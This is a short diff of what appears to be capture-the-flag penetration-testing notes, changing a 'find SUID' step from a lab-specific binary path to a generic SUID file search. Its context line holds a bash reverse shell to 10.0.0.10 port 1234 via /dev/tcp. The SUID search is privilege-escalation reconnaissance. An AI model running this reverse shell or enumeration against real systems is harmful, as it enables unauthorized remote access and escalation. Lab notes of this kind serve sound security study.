@@ -40,5 +40,5 @@ exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'");
 #### find SUID 
 
 ```shell
-/var/htb/bin/emergency
+find / -perm -u=s -type f 2>/dev/null
 ```
